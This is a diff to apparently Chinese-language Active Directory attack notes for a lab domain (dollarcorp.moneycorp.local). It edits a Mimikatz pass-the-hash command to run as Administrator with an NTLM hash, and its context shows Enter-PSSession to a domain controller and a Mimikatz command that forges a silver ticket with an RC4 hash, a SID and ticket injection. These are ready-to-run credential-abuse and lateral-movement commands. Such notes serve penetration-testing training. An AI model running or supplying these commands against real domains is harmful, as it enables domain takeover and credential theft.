@@ -55,7 +55,7 @@ Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator
 
 # 以某个用户的身份打开一个新的shell，有这个用户的所有权限，但是还在本机环境中（需要NTML）
 ```
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
 ```
 
 # 使用 Mimikatz 进行横向运动
@@ -140,7 +140,7 @@ NTLM : 126289c16302fb23b71ec09f0d3d5391
 ```
 可以用来制作银票
 
-执行命令
+普通权限shell下执行命令
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
 ```
